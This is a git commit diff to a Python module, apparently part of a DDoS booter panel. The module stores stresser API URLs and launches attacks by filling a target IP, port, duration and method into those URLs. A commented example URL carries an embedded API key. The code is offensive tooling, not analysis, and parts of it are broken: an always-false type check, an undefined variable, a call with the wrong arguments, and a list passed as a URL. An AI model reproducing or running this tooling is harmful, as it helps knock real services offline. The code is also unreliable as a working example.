59fc518f382a48b8e35bfe6dc665d8afda32554d
n4n0 <74839733+DevZerda@users.noreply.github.com>
2021-06-26 19:11:44 -0400

    Update main.py

--- assets/api_attack_system/main.py
+++ assets/api_attack_system/main.py
@@ -1,4 +1,4 @@
-import os, sys, time
+import os, sys, time, requests
 
 from ..Config.main import *
 from ..auth.crud import *
@@ -25,7 +25,7 @@ class APICrud:
 
         return api_List
 
-    def GetAPI(apiName):
+    def GetAPI(apiiName):
         apiDB = open("./assets/db/apis.db", "r").read()
         apis = apiDB.split("\n")
 
@@ -33,13 +33,34 @@ class APICrud:
         for api in apis:
             i += 1
             if len(api) > 5:
-                if api.startswith(f"api_Name={apiName}"):
-                    apiName = api.replace("api_Name=", "")
+                if api.startswith(f"api_Name={apiiName}"):
+                    apiiName = api.replace("api_Name=", "")
                     apiURL = apis[i].replace("api_URL=", "")
                     apiMethods = apis[i+1].replace("api_Methods=", "")
                     apiAccess = apis[i+2].replace("api_Access=", "")
-                    return f"{apiName},{apiURL},{apiMethods},{apiAccess}"
+                    return f"{apiiName},{apiURL},{apiMethods},{apiAccess}"
         return "[x] Error, No API Found!"
+
+    def GetAPIWithMethod(method):
+        """
+        This function return a 2D Array of the APIs to send attack with and the name of the API
+        to send back to the client
+        """
+        apiDB = open("./assets/db/apis.db", "r").read()
+        apis = apiDB.split("\n")
+
+        ListOfAPIs = []
+
+        i = 0
+        for api in apis:
+            i += 1
+            if len(api) > 5:
+                if api.startswith("api_Methods="):
+                    if f",{method}" in api or f"{method}," in api:
+                        apiiName = apis[i-3].replace("api_Name=", "")
+                        apiURL = apis[i-2].replace("api_URL=", "")
+                        ListOfAPIs.append([apiiName, apiURL])
+        return ListOfAPIs
 
 # api_Name=WockAPI
 # api_URL=https://WockSec.xyz/api/L4.php?key=fRgtw4t54hFWUj675$ge&host={ip}&port={port}&time={time}&method={method}
@@ -51,11 +72,81 @@ class APICrud:
         apiDB = open("./assets/db/users.db", "a")
         apiDB.write(f"api_Name={apiName}\napi_URL={api}\napi_Methods={methods}\napi_Access={usemode}\napi_Funnel=N/A\n")
         apiDB.close()
+        return f"[+] API: {apiName} successfully added!\r\n"
 
     def removeAPI(apiName):
-        pass
+        apiDB = open("./assets/db/apis.db", "r").read()
+        apis = apiDB.split("\n")
+
+        new_apiDB = ""
+        i = 0
+        for api in apis:
+            i+=1
+            if len(api) > 5:
+                if api.startswith(f"api_Name={apiName}") == False:
+                    apiiName = api.replace("api_Name=", "")
+                    apiURL = apis[i].replace("api_URL=", "")
+                    apiMethods = apis[i+1].replace("api_Methods=", "")
+                    apiAccess = apis[i+2].replace("api_Access=", "")
+                    new_apiDB += api
+        
+        w_apiDB = open("./assets/db/apis.db", "w")
+        w_apiDB.write(new_apiDB)
+        w_apiDB.close()
+        return f"[+] API: {apiName} successfully removed!\r\n"
+                    
 
     def updateAPI(apiName, new_api, methods):
         pass
 
-# class APIFunc:
+    
+    def fixFunneledMethods(apiName, method):
+        apiDB = open("./assets/db/apis.db", "r").read()
+        apis = apiDB.split("\n")
+
+        i = 0
+        for api in apis:
+            i += 1
+            if len(api) > 5:
+                if api.startswith(f"api_Name={apiiName}"):
+                    apiiName = api.replace("api_Name=", "")
+                    apiURL = apis[i].replace("api_URL=", "")
+                    apiMethods = apis[i+1].replace("api_Methods=", "")
+                    apiAccess = apis[i+2].replace("api_Access=", "")
+                    apiFunnel = apis[i+3].replace("api_Funnel=", "")
+                    if "|" in apiFunnel:
+                        apiFunnels = apiFunnel.split("|")
+                        for Funnel in apiFunnels:
+                            if Funnel.split(":")[0] == method:
+                                return Funnel.split(":")[1]
+
+        return method
+        
+
+class APIFunc:
+    def SendAPI_Attack(ip, port, time, method):
+        """
+        Get APIs based on the method being used
+        """
+        APIs = APICrud.GetAPIWithMethod(method) ## 2D Array
+
+        Response = ""
+
+        if isinstance(len(APIs), list):
+            for u in APIs:
+                u[1] = u[1].replace("{ip}", f"{ip}")
+                u[1] = u[1].replace("{port}", f"{port}")
+                u[1] = u[1].replace("{time}", f"{time}")
+                u[1] = u[1].replace("{method}", APICrud.fixFunneledMethods(method))
+                output = requests.get(f"{u}")
+                print(output) ## debug
+                Response += f"[+] Attack sent {ip}:{port} for {time} seconds with {method} | {u[0]}\r\n"
+        else:
+            output = requests.get(f"{APIs}")
+            print(output) ## debug
+
+        return Response
+
+
+
+
